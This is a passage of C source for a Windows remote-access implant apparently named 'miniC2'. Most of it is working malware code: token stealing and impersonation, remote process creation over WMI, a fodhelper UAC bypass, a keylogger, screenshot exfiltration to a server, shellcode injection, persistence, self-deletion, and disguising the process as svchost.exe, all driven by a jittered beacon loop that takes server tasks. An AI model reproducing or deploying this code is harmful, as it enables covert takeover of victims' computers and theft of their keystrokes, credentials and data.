        CloseHandle(hThread);
    } else {
        snprintf(output, out_len, "{\"error\":\"CreateRemoteThread failed\"}");
    }
    CloseHandle(hProc);
}

static void steal_token(const char* pid_str, char* output, int out_len) {
    DWORD pid = (DWORD)strtoul(pid_str, NULL, 10);
    if (pid == 0) { strcpy_s(output, out_len, "{\"error\":\"invalid PID\"}"); return; }
    HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProc) { snprintf(output, out_len, "{\"error\":\"OpenProcess failed, access denied\"}"); return; }
    HANDLE hToken = NULL;
    if (!OpenProcessToken(hProc, TOKEN_IMPERSONATE | TOKEN_QUERY, &hToken)) {
        CloseHandle(hProc);
        snprintf(output, out_len, "{\"error\":\"OpenProcessToken failed\"}"); return;
    }
    char name_buf[256] = {0}, domain_buf[256] = {0};
    DWORD name_size = 256, domain_size = 256, use = 0;
    TOKEN_USER* ptu = NULL;
    DWORD needed = 0;
    GetTokenInformation(hToken, TokenUser, NULL, 0, &needed);
    if (needed > 0) {
        ptu = (TOKEN_USER*)malloc(needed);
        if (GetTokenInformation(hToken, TokenUser, ptu, needed, &needed)) {
            LookupAccountSidA(NULL, ptu->User.Sid, name_buf, &name_size, domain_buf, &domain_size, (SID_NAME_USE*)&use);
        }
        free(ptu);
    }
    if (ImpersonateLoggedOnUser(hToken)) {
        char who[512] = {0};
        snprintf(who, 512, "%s\\%s", domain_buf[0] ? domain_buf : "?", name_buf[0] ? name_buf : "?");
        snprintf(output, out_len, "{\"status\":\"ok\",\"impersonated\":\"%s\",\"pid\":%lu}", who, (unsigned long)pid);
    } else {
        snprintf(output, out_len, "{\"error\":\"ImpersonateLoggedOnUser failed, code %lu\"}", GetLastError());
    }
    CloseHandle(hToken);
    CloseHandle(hProc);
}

static void revert_token(char* output, int out_len) {
    if (RevertToSelf())
        strcpy_s(output, out_len, "{\"status\":\"ok\",\"message\":\"token reverted\"}");
    else
        snprintf(output, out_len, "{\"error\":\"RevertToSelf failed, code %lu\"}", GetLastError());
}

static void wmi_exec(const char* host, const char* cmd_str, char* output, int out_len) {
    if (!host[0] || !cmd_str[0]) { strcpy_s(output, out_len, "{\"error\":\"host and cmd required\"}"); return; }
    wchar_t whost[256] = {0}, wcmd[2048] = {0};
    MultiByteToWideChar(CP_ACP, 0, host, -1, whost, 256);
    MultiByteToWideChar(CP_ACP, 0, cmd_str, -1, wcmd, 2048);
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    IWbemLocator* pLoc = NULL;
    hr = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
    if (FAILED(hr)) { CoUninitialize(); snprintf(output, out_len, "{\"error\":\"WbemLocator failed\"}"); return; }
    IWbemServices* pSvc = NULL;
    wchar_t wnet[512]; swprintf(wnet, 512, L"\\\\%s\\root\\cimv2", whost);
    hr = pLoc->ConnectServer(_bstr_t(wnet), NULL, NULL, 0, NULL, 0, 0, &pSvc);
    if (FAILED(hr)) { pLoc->Release(); CoUninitialize(); snprintf(output, out_len, "{\"error\":\"ConnectServer failed\"}"); return; }
    hr = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
    IEnumWbemClassObject* pEnum = NULL;
    wchar_t wq[512]; swprintf(wq, 512, L"SELECT __PATH FROM Win32_Process WHERE Name='notepad.exe'");
    hr = pSvc->ExecQuery(_bstr_t(L"WQL"), _bstr_t(wq), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnum);
    wchar_t wmethod[256] = L"Create";
    wchar_t winput[4096]; swprintf(winput, 4096, L"CommandLine=\"%s\",CurrentDirectory=\"C:\\\\Windows\\\\Temp\"", wcmd);
    IWbemClassObject* pIn = NULL;
    hr = pSvc->GetObject(_bstr_t(L"Win32_Process"), 0, NULL, &pIn, NULL);
    if (FAILED(hr)) { pLoc->Release(); pSvc->Release(); CoUninitialize(); snprintf(output, out_len, "{\"error\":\"GetObject Win32_Process failed\"}"); return; }
    IWbemClassObject* pMethod = NULL;
    hr = pIn->GetMethod(_bstr_t(L"Create"), 0, &pMethod, NULL);
    if (FAILED(hr)) { pIn->Release(); pLoc->Release(); pSvc->Release(); CoUninitialize(); snprintf(output, out_len, "{\"error\":\"GetMethod Create failed\"}"); return; }
    IWbemClassObject* pInInst = NULL;
    hr = pMethod->SpawnInstance(0, &pInInst);
    if (FAILED(hr)) { pMethod->Release(); pIn->Release(); pLoc->Release(); pSvc->Release(); CoUninitialize(); snprintf(output, out_len, "{\"error\":\"SpawnInstance failed\"}"); return; }
    VARIANT vtCmd; VariantInit(&vtCmd); vtCmd.vt = VT_BSTR; vtCmd.bstrVal = SysAllocString(wcmd);
    pInInst->Put(_bstr_t(L"CommandLine"), 0, &vtCmd, 0);
    VariantClear(&vtCmd);
    IWbemClassObject* pOut = NULL;
    hr = pSvc->ExecMethod(_bstr_t(L"Win32_Process"), _bstr_t(L"Create"), 0, NULL, pInInst, &pOut, NULL);
    if (SUCCEEDED(hr) && pOut) {
        VARIANT vtRet; VariantInit(&vtRet);
        pOut->Get(_bstr_t(L"ReturnValue"), 0, &vtRet, NULL, NULL);
        long retcode = (vtRet.vt == VT_I4) ? vtRet.lVal : -1;
        VariantClear(&vtRet);
        snprintf(output, out_len, "{\"status\":\"ok\",\"host\":\"%s\",\"return\":%ld,\"cmd\":\"%s\"}", host, retcode, cmd_str);
        pOut->Release();
    } else {
        snprintf(output, out_len, "{\"error\":\"ExecMethod failed, hr=0x%08lx\"}", (unsigned long)hr);
    }
    pInInst->Release(); pMethod->Release(); pIn->Release();
    if (pEnum) pEnum->Release();
    pLoc->Release(); pSvc->Release();
    CoUninitialize();
}

static void selfdestruct(char* output, int out_len) {
    strcpy_s(output, out_len, "{\"status\":\"ok\",\"message\":\"self-destructing\"}");
    char escaped[MAX_BUF];
    json_escape(output, escaped, MAX_BUF);
    char result[MAX_BUF * 2];
    snprintf(result, sizeof(result),
        "{\"task_id\":\"selfdestruct\",\"agent_id\":\"%s\",\"output\":\"%s\",\"success\":true}",
        g_agent_id, escaped);
    https_post(L"/result", result, output, MAX_BUF);
    char exe_path[MAX_PATH];
    GetModuleFileNameA(NULL, exe_path, MAX_PATH);
    STARTUPINFOA si = {0}; PROCESS_INFORMATION pi = {0};
    char cmd[512];
    snprintf(cmd, 512, "cmd /c timeout /t 2 /nobreak >nul & del \"%s\"", exe_path);
    CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (pi.hProcess) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
    ExitProcess(0);
}

static void uac_bypass(const char* cmd_str, char* output, int out_len) {
    if (!cmd_str[0]) { strcpy_s(output, out_len, "{\"error\":\"cmd required\"}"); return; }
    HKEY hKey;
    LONG res = RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\Open\\Command", 0, KEY_SET_VALUE, &hKey);
    if (res != ERROR_SUCCESS) { snprintf(output, out_len, "{\"error\":\"registry open failed, code %ld\"}", res); return; }
    RegSetValueExA(hKey, "", 0, REG_SZ, (BYTE*)cmd_str, (DWORD)(strlen(cmd_str) + 1));
    RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (BYTE*)"", 1);
    RegCloseKey(hKey);
    STARTUPINFOA si = {0}; PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    CreateProcessA(NULL, "fodhelper.exe", NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (pi.hProcess) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
    Sleep(2000);
    RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\Open\\Command");
    snprintf(output, out_len, "{\"status\":\"ok\",\"cmd\":\"%s\",\"method\":\"fodhelper\"}", cmd_str);
}

static void list_tokens(char* output, int out_len) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) { strcpy_s(output, out_len, "{\"error\":\"snapshot failed\"}"); return; }
    char buf[MAX_BUF] = {0};
    int pos = 0;
    pos += snprintf(buf + pos, MAX_BUF - pos, "PID      Process\n");
    PROCESSENTRY32 pe = {0}; pe.dwSize = sizeof(pe);
    if (Process32First(hSnap, &pe)) {
        do {
            HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
            if (hProc) {
                HANDLE hToken;
                if (OpenProcessToken(hProc, TOKEN_QUERY, &hToken)) {
                    DWORD needed = 0;
                    GetTokenInformation(hToken, TokenUser, NULL, 0, &needed);
                    if (needed > 0) {
                        TOKEN_USER* ptu2 = (TOKEN_USER*)malloc(needed);
                        if (GetTokenInformation(hToken, TokenUser, ptu2, needed, &needed)) {
                            char name[128] = {0}, domain[128] = {0};
                            DWORD ns = 128, ds = 128, use = 0;
                            LookupAccountSidA(NULL, ptu2->User.Sid, name, &ns, domain, &ds, (SID_NAME_USE*)&use);
                            pos += snprintf(buf + pos, MAX_BUF - pos, "%-8lu %s\\%s  (%s)\n",
                                pe.th32ProcessID, domain[0] ? domain : "-", name[0] ? name : "-", pe.szExeFile);
                        }
                        free(ptu2);
                    }
                    CloseHandle(hToken);
                }
                CloseHandle(hProc);
            }
        } while (Process32Next(hSnap, &pe));
    }
    CloseHandle(hSnap);
    if (pos == 0) strcpy_s(output, out_len, "{\"error\":\"no tokens found\"}");
    else {
        char esc[MAX_BUF]; json_escape(buf, esc, MAX_BUF);
        snprintf(output, out_len, "{\"tokens\":\"%s\"}", esc);
    }
}

static void env_get(const char* name, char* output, int out_len) {
    if (!name[0]) {
        char buf[MAX_BUF] = {0}; int pos = 0;
        pos += snprintf(buf + pos, MAX_BUF - pos, "Variable=Value\n");
        LPCH envBlock = GetEnvironmentStringsA();
        if (envBlock) {
            LPSTR p = (LPSTR)envBlock;
            while (*p) {
                int len = (int)strlen(p);
                if (pos + len + 2 < MAX_BUF) { memcpy(buf + pos, p, len); pos += len; buf[pos++] = '\n'; }
                p += len + 1;
            }
            FreeEnvironmentStrings(envBlock);
        }
        buf[pos] = 0;
        char esc[MAX_BUF]; json_escape(buf, esc, MAX_BUF);
        snprintf(output, out_len, "{\"env\":\"%s\"}", esc);
    } else {
        char val[4096] = {0};
        DWORD sz = GetEnvironmentVariableA(name, val, 4096);
        if (sz > 0 && sz < 4096) {
            char en[256], ev[4096]; json_escape(name, en, 256); json_escape(val, ev, 4096);
            snprintf(output, out_len, "{\"name\":\"%s\",\"value\":\"%s\"}", en, ev);
        } else {
            snprintf(output, out_len, "{\"error\":\"variable %s not found\"}", name);
        }
    }
}

static void env_set(const char* name, const char* value, char* output, int out_len) {
    if (!name[0]) { strcpy_s(output, out_len, "{\"error\":\"name required\"}"); return; }
    if (SetEnvironmentVariableA(name, value[0] ? value : NULL)) {
        char en[256]; json_escape(name, en, 256);
        snprintf(output, out_len, "{\"status\":\"ok\",\"name\":\"%s\"}", en);
    } else {
        snprintf(output, out_len, "{\"error\":\"SetEnvironmentVariable failed, code %lu\"}", GetLastError());
    }
}

static LRESULT CALLBACK KeyLogProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* kbd = (KBDLLHOOKSTRUCT*)lParam;
        UINT vk = kbd->vkCode;
        char keyname[128] = {0};
        if (vk >= '0' && vk <= '9') {
            BOOL shift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
            const char* shifted = shift ? ")!@#$%^&*(" : "0123456789";
            if (shift) { keyname[0] = shifted[vk - '0']; }
            else { keyname[0] = (char)vk; }
        } else if (vk >= 'A' && vk <= 'Z') {
            BOOL shift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
            BOOL caps = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
            keyname[0] = (shift ^ caps) ? (char)vk : (char)(vk + 32);
        } else {
            switch (vk) {
                case VK_SPACE: strcpy_s(keyname, " "); break;
                case VK_RETURN: strcpy_s(keyname, "[ENTER]"); break;
                case VK_TAB: strcpy_s(keyname, "[TAB]"); break;
                case VK_BACK: strcpy_s(keyname, "[BS]"); break;
                case VK_ESCAPE: strcpy_s(keyname, "[ESC]"); break;
                case VK_DELETE: strcpy_s(keyname, "[DEL]"); break;
                case VK_LEFT: strcpy_s(keyname, "[LEFT]"); break;
                case VK_RIGHT: strcpy_s(keyname, "[RIGHT]"); break;
                case VK_UP: strcpy_s(keyname, "[UP]"); break;
                case VK_DOWN: strcpy_s(keyname, "[DOWN]"); break;
                case VK_LCONTROL: case VK_RCONTROL: strcpy_s(keyname, "[CTRL]"); break;
                case VK_LMENU: case VK_RMENU: strcpy_s(keyname, "[ALT]"); break;
                case VK_LSHIFT: case VK_RSHIFT: strcpy_s(keyname, "[SHIFT]"); break;
                case VK_F1: strcpy_s(keyname, "[F1]"); break;
                case VK_F2: strcpy_s(keyname, "[F2]"); break;
                case VK_F3: strcpy_s(keyname, "[F3]"); break;
                case VK_F4: strcpy_s(keyname, "[F4]"); break;
                case VK_F5: strcpy_s(keyname, "[F5]"); break;
                case VK_F6: strcpy_s(keyname, "[F6]"); break;
                case VK_F7: strcpy_s(keyname, "[F7]"); break;
                case VK_F8: strcpy_s(keyname, "[F8]"); break;
                case VK_F9: strcpy_s(keyname, "[F9]"); break;
                case VK_F10: strcpy_s(keyname, "[F10]"); break;
                case VK_F11: strcpy_s(keyname, "[F11]"); break;
                case VK_F12: strcpy_s(keyname, "[F12]"); break;
                default:
                    GetKeyNameTextA((LONG)(kbd->scanCode << 16), keyname, 128);
                    char tmp[140];
                    snprintf(tmp, sizeof(tmp), "[%s]", keyname);
                    strcpy_s(keyname, tmp);
                    break;
            }
        }
        EnterCriticalSection(&g_keylog_cs);
        int klen = (int)strlen(keyname);
        if (g_keylog_pos + klen < MAX_BUF - 1) {
            memcpy(g_keylog_buf + g_keylog_pos, keyname, klen);
            g_keylog_pos += klen;
            g_keylog_buf[g_keylog_pos] = 0;
        }
        LeaveCriticalSection(&g_keylog_cs);
    }
    return CallNextHookEx(g_keyhook, nCode, wParam, lParam);
}

static DWORD WINAPI keylog_thread(LPVOID param) {
    g_keyhook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyLogProc, NULL, 0);
    if (!g_keyhook) return 1;
    MSG msg;
    while (!g_keylog_stop_flag && GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    if (g_keyhook) { UnhookWindowsHookEx(g_keyhook); g_keyhook = NULL; }
    return 0;
}

static void keylog_start(char* output, int out_len) {
    if (g_keylog_active) {
        strcpy_s(output, out_len, "{\"error\":\"keylogger already active\"}");
        return;
    }
    InitializeCriticalSection(&g_keylog_cs);
    g_keylog_pos = 0;
    g_keylog_buf[0] = 0;
    g_keylog_stop_flag = FALSE;
    g_keylog_active = TRUE;
    g_keylog_thread = CreateThread(NULL, 0, keylog_thread, NULL, 0, &g_keylog_thread_id);
    if (g_keylog_thread)
        strcpy_s(output, out_len, "{\"status\":\"ok\",\"message\":\"keylogger started\"}");
    else {
        strcpy_s(output, out_len, "{\"error\":\"failed to start keylogger\"}");
        g_keylog_active = FALSE;
    }
}

static void keylog_dump(char* output, int out_len) {
    if (!g_keylog_active) {
        strcpy_s(output, out_len, "{\"error\":\"keylogger not active\"}");
        return;
    }
    EnterCriticalSection(&g_keylog_cs);
    char escaped[MAX_BUF];
    json_escape(g_keylog_buf, escaped, MAX_BUF);
    snprintf(output, out_len, "{\"keystrokes\":\"%s\",\"length\":%d}", escaped, g_keylog_pos);
    g_keylog_pos = 0;
    g_keylog_buf[0] = 0;
    LeaveCriticalSection(&g_keylog_cs);
}

static void keylog_stop(char* output, int out_len) {
    if (!g_keylog_active) {
        strcpy_s(output, out_len, "{\"error\":\"keylogger not active\"}");
        return;
    }
    g_keylog_stop_flag = TRUE;
    PostThreadMessage(g_keylog_thread_id, WM_QUIT, 0, 0);
    if (g_keylog_thread) {
        WaitForSingleObject(g_keylog_thread, 3000);
        CloseHandle(g_keylog_thread);
        g_keylog_thread = NULL;
    }
    g_keylog_active = FALSE;
    EnterCriticalSection(&g_keylog_cs);
    char escaped[MAX_BUF];
    json_escape(g_keylog_buf, escaped, MAX_BUF);
    snprintf(output, out_len, "{\"status\":\"stopped\",\"keystrokes\":\"%s\",\"length\":%d}", escaped, g_keylog_pos);
    g_keylog_pos = 0;
    g_keylog_buf[0] = 0;
    LeaveCriticalSection(&g_keylog_cs);
    DeleteCriticalSection(&g_keylog_cs);
}

static void process_task(const char* task_json) {
    char tid[64] = {0}, cmd[64] = {0}, output[MAX_BUF] = {0};
    char v1[MAX_BUF] = {0}, v2[MAX_BUF] = {0};
    json_find_value(task_json, "task_id", tid, 64);
    json_find_value(task_json, "command", cmd, 64);

    if (strcmp(cmd, "shell") == 0) {
        json_find_value(task_json, "cmd", v1, MAX_BUF);
        exec_shell(v1, output, MAX_BUF);
    }
    else if (strcmp(cmd, "powershell") == 0) {
        json_find_value(task_json, "cmd", v1, MAX_BUF);
        exec_powershell(v1, output, MAX_BUF);
    }
    else if (strcmp(cmd, "sysinfo") == 0) {
        gather_sysinfo(output, MAX_BUF);
    }
    else if (strcmp(cmd, "whoami") == 0) {
        whoami_cmd(output, MAX_BUF);
    }
    else if (strcmp(cmd, "screenshot") == 0) {
        char tmp_path[MAX_PATH];
        GetTempPathA(MAX_PATH, tmp_path);
        strcat_s(tmp_path, "miniC2_screen.bmp");
        take_screenshot(tmp_path);
        FILE* f = fopen(tmp_path, "rb");
        if (f) {
            fseek(f, 0, SEEK_END);
            long size = ftell(f);
            fseek(f, 0, SEEK_SET);
            if (size > 0 && size < MAX_FILE_BUF) {
                char* data = (char*)malloc(size);
                fread(data, 1, size, f);
                fclose(f);
                char resp[4096] = {0};
                char fname[128];
                sprintf_s(fname, "screenshot_%s.bmp", g_agent_id);
                if (https_upload(L"/api/upload", fname, data, (DWORD)size, resp, 4096))
                    snprintf(output, MAX_BUF, "{\"status\":\"uploaded\",\"size\":%ld,\"server\":%s}", size, resp);
                else
                    snprintf(output, MAX_BUF, "{\"error\":\"upload failed\",\"size\":%ld}", size);
                free(data);
            } else {
                fclose(f);
                snprintf(output, MAX_BUF, "{\"error\":\"screenshot too large or empty: %ld bytes\"}", size);
            }
        } else {
            snprintf(output, MAX_BUF, "{\"error\":\"cannot create temp file\"}");
        }
        DeleteFileA(tmp_path);
    }
    else if (strcmp(cmd, "download") == 0) {
        json_find_value(task_json, "remote_path", v1, MAX_BUF);
        download_file(v1, output, MAX_BUF);
    }
    else if (strcmp(cmd, "upload") == 0) {
        json_find_value(task_json, "remote_path", v1, MAX_BUF);
        json_find_value(task_json, "local_data_b64", v2, MAX_BUF);
        upload_file(v1, v2, output, MAX_BUF);
    }
    else if (strcmp(cmd, "ps") == 0) {
        list_processes(output, MAX_BUF);
    }
    else if (strcmp(cmd, "kill-process") == 0) {
        json_find_value(task_json, "pid", v1, MAX_BUF);
        kill_process(v1, output, MAX_BUF);
    }
    else if (strcmp(cmd, "persist") == 0) {
        json_find_value(task_json, "action", v1, 64);
        if (strcmp(v1, "remove") == 0)
            remove_persistence(output, MAX_BUF);
        else if (strcmp(v1, "schtasks") == 0)
            add_persistence_schtasks(output, MAX_BUF);
        else
            add_persistence(output, MAX_BUF);
    }
    else if (strcmp(cmd, "portscan") == 0) {
        json_find_value(task_json, "target", v1, MAX_BUF);
        json_find_value(task_json, "ports", v2, MAX_BUF);
        char timeout_str[32] = {0};
        json_find_value(task_json, "timeout", timeout_str, 32);
        int timeout_ms = timeout_str[0] ? atoi(timeout_str) : 2000;
        portscan(v1, v2, timeout_ms, output, MAX_BUF);
    }
    else if (strcmp(cmd, "sleep") == 0) {
        json_find_value(task_json, "seconds", v1, 32);
        if (v1[0]) {
            g_sleep = atoi(v1);
            if (g_sleep < 1) g_sleep = 1;
            snprintf(output, MAX_BUF, "{\"status\":\"ok\",\"sleep\":%d}", g_sleep);
        } else {
            snprintf(output, MAX_BUF, "{\"error\":\"missing seconds parameter\"}");
        }
    }
    else if (strcmp(cmd, "keylog") == 0) {
        json_find_value(task_json, "action", v1, 32);
        if (strcmp(v1, "start") == 0) keylog_start(output, MAX_BUF);
        else if (strcmp(v1, "dump") == 0) keylog_dump(output, MAX_BUF);
        else if (strcmp(v1, "stop") == 0) keylog_stop(output, MAX_BUF);
        else snprintf(output, MAX_BUF, "{\"error\":\"unknown keylog action: %s\"}", v1);
    }
    else if (strcmp(cmd, "kill") == 0) {
        ExitProcess(0);
    }
    else if (strcmp(cmd, "inject") == 0) {
        json_find_value(task_json, "pid", v1, 32);
        json_find_value(task_json, "shellcode", v2, MAX_BUF);
        inject_shellcode(v1, v2, output, MAX_BUF);
    }
    else if (strcmp(cmd, "steal_token") == 0) {
        json_find_value(task_json, "pid", v1, 32);
        steal_token(v1, output, MAX_BUF);
    }
    else if (strcmp(cmd, "revert_token") == 0) {
        revert_token(output, MAX_BUF);
    }
    else if (strcmp(cmd, "wmi_exec") == 0) {
        json_find_value(task_json, "host", v1, MAX_BUF);
        json_find_value(task_json, "cmd", v2, MAX_BUF);
        wmi_exec(v1, v2, output, MAX_BUF);
    }
    else if (strcmp(cmd, "selfdestruct") == 0) {
        selfdestruct(output, MAX_BUF);
    }
    else if (strcmp(cmd, "uac_bypass") == 0) {
        json_find_value(task_json, "cmd", v1, MAX_BUF);
        uac_bypass(v1, output, MAX_BUF);
    }
    else if (strcmp(cmd, "list_tokens") == 0) {
        list_tokens(output, MAX_BUF);
    }
    else if (strcmp(cmd, "env") == 0) {
        json_find_value(task_json, "action", v1, 32);
        if (strcmp(v1, "set") == 0) {
            json_find_value(task_json, "name", v2, MAX_BUF);
            char v3[MAX_BUF] = {0};
            json_find_value(task_json, "value", v3, MAX_BUF);
            env_set(v2, v3, output, MAX_BUF);
        } else {
            json_find_value(task_json, "name", v2, MAX_BUF);
            env_get(v2, output, MAX_BUF);
        }
    }
    else {
        snprintf(output, MAX_BUF, "{\"error\":\"unknown command: %s\"}", cmd);
    }

    char escaped[MAX_BUF];
    json_escape(output, escaped, MAX_BUF);
    char result[MAX_BUF * 2];
    snprintf(result, sizeof(result),
        "{\"task_id\":\"%s\",\"agent_id\":\"%s\",\"output\":\"%s\",\"success\":true}",
        tid, g_agent_id, escaped);
    https_post(L"/result", result, output, MAX_BUF);
}

static DWORD calc_sleep(int base, int jitter_pct) {
    int jitter = (base * jitter_pct) / 100;
    if (jitter < 1) jitter = 1;
    int offset = (rand() % (2 * jitter + 1)) - jitter;
    int result = base + offset;
    if (result < 1) result = 1;
    return (DWORD)(result * 1000);
}

static void disguise_process() {
    typedef BOOL (WINAPI *SetProcessDEPPolicyPtr)(DWORD);
    HMODULE k32 = GetModuleHandleA("kernel32.dll");
    if (k32) {
        SetProcessDEPPolicyPtr fn = (SetProcessDEPPolicyPtr)GetProcAddress(k32, "SetProcessDEPPolicy");
        if (fn) fn(0x01);
    }

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return;

    typedef NTSTATUS (WINAPI *NtQueryInformationProcessPtr)(HANDLE, ULONG, PVOID, ULONG, PULONG);
    typedef NTSTATUS (WINAPI *NtWriteVirtualMemoryPtr)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
    NtQueryInformationProcessPtr NtQueryInformationProcess =
        (NtQueryInformationProcessPtr)GetProcAddress(ntdll, "NtQueryInformationProcess");
    NtWriteVirtualMemoryPtr NtWriteVirtualMemory =
        (NtWriteVirtualMemoryPtr)GetProcAddress(ntdll, "NtWriteVirtualMemory");
    if (!NtQueryInformationProcess || !NtWriteVirtualMemory) return;

    HANDLE hProc = GetCurrentProcess();
    ULONG_PTR peb = 0;
    PROCESS_BASIC_INFORMATION pbi = {0};
    NTSTATUS st = NtQueryInformationProcess(hProc, 0, &pbi, sizeof(pbi), NULL);
    if (st != 0) return;
    peb = (ULONG_PTR)pbi.PebBaseAddress;
    if (!peb) return;

#ifdef _WIN64
    const char* fake_name = "svchost.exe";
    ULONG_PTR params_ptr = 0;
    ReadProcessMemory(hProc, (LPCVOID)(peb + 0x20), &params_ptr, sizeof(params_ptr), NULL);
    if (!params_ptr) return;
    UNICODE_STRING us;
    ReadProcessMemory(hProc, (LPCVOID)(params_ptr + 0x60), &us, sizeof(us), NULL);
    if (!us.Buffer || us.Length == 0) return;
    wchar_t wname[64];
    int n = MultiByteToWideChar(CP_ACP, 0, fake_name, -1, wname, 64);
    SIZE_T written = 0;
    NtWriteVirtualMemory(hProc, us.Buffer, wname, n * sizeof(wchar_t), &written);
    if (written > 0) {
        USHORT new_len = (USHORT)((n - 1) * sizeof(wchar_t));
        NtWriteVirtualMemory(hProc, (PVOID)((ULONG_PTR)&us + 0), &new_len, sizeof(USHORT), &written);
    }
#else
    const char* fake_name = "svchost.exe";
    ULONG_PTR params_ptr = 0;
    ReadProcessMemory(hProc, (LPCVOID)(peb + 0x10), &params_ptr, sizeof(params_ptr), NULL);
    if (!params_ptr) return;
    UNICODE_STRING us;
    ReadProcessMemory(hProc, (LPCVOID)(params_ptr + 0x38), &us, sizeof(us), NULL);
    if (!us.Buffer || us.Length == 0) return;
    wchar_t wname[64];
    int n = MultiByteToWideChar(CP_ACP, 0, fake_name, -1, wname, 64);
    SIZE_T written = 0;
    NtWriteVirtualMemory(hProc, us.Buffer, wname, n * sizeof(wchar_t), &written);
    if (written > 0) {
        USHORT new_len = (USHORT)((n - 1) * sizeof(wchar_t));
        NtWriteVirtualMemory(hProc, (PVOID)((ULONG_PTR)&us + 0), &new_len, sizeof(USHORT), &written);
    }
#endif
}

int main() {
    FreeConsole();
    disguise_process();
    srand((unsigned int)time(NULL));

    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    if (!g_has_id) {
        generate_short_id(g_agent_id, 64);
        g_has_id = TRUE;
    }

    char checkin_buf[MAX_BUF];
    char response[MAX_BUF];
    build_checkin(checkin_buf, MAX_BUF);

    while (1) {
        if (https_post(L"/checkin", checkin_buf, response, MAX_BUF)) {
            const char* tasks_arr = strstr(response, "\"tasks\":");
            if (tasks_arr) {
                tasks_arr += 8;
                while (*tasks_arr && *tasks_arr != '[') tasks_arr++;
                if (*tasks_arr == '[') {
                    tasks_arr++;
                    while (*tasks_arr) {
                        while (*tasks_arr == ' ' || *tasks_arr == ',') tasks_arr++;
                        if (*tasks_arr != '{') break;
                        const char* obj_start = tasks_arr;
                        int depth = 0;
                        const char* q = obj_start;
                        do {
                            if (*q == '{') depth++;
                            if (*q == '}') depth--;
                            q++;
                        } while (depth > 0 && *q);
                        if (depth == 0) {
                            int tlen = (int)(q - obj_start);
                            if (tlen > 0 && tlen < MAX_BUF) {
                                char tj[MAX_BUF];
                                strncpy_s(tj, obj_start, tlen);
                                tj[tlen] = 0;
                                process_task(tj);
                            }
                        }
                        tasks_arr = q;
                    }
                }
            }
        }
        build_checkin(checkin_buf, MAX_BUF);
        Sleep(calc_sleep(g_sleep, SLEEP_JITTER));
    }
    return 0;
}
